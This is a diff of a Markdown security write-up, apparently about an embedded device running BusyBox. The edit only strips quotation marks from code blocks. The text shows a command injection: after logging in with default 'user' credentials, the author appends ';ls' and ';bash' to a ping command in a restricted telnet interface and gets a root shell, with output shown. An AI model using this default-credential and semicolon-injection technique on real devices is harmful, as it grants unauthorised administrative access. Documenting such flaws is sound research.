@@ -139,7 +139,7 @@ Not so surprisingly, the binairies we want exist in the /bin folder, the shell w
 We have access to ping...
 
  ```
- > "ping -c 1 127.0.0.1"
+ > ping -c 1 127.0.0.1
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.866 ms
 
@@ -151,11 +151,11 @@ round-trip min/avg/max = 0.866/0.866/0.866 ms
 I wonder if... Let's try some semicolon magic!
 
 ```
-> "ls"
+> ls
 telnetd:error:997.792:processInput:406:unrecognized command ls
  >
  >
- > "ping -c 1 127.0.0.1;ls"
+ > ping -c 1 127.0.0.1;ls
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.948 ms
 
@@ -170,7 +170,7 @@ dev      linuxrc  proc     tmp      webs
 Alright! this way I can get a real shell
 
 ```
- > "ping -c 1 127.0.0.1;bash"
+ > ping -c 1 127.0.0.1;bash
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.459 ms
 
@@ -182,7 +182,7 @@ round-trip min/avg/max = 0.459/0.459/0.459 ms
 BusyBox v1.17.2 (2013-09-30 17:48:17 CST) built-in shell (ash)
 Enter 'help' for a list of built-in commands.
 
-"#" 
+# 
 ```
 
  Using the username user and the default password user followed by this ping/semicolon loophole gives us access to a shell with administrative rights more easiy than brute-forcing the admin's password (default 4 letters, can be changed for another one up to 16 letters).
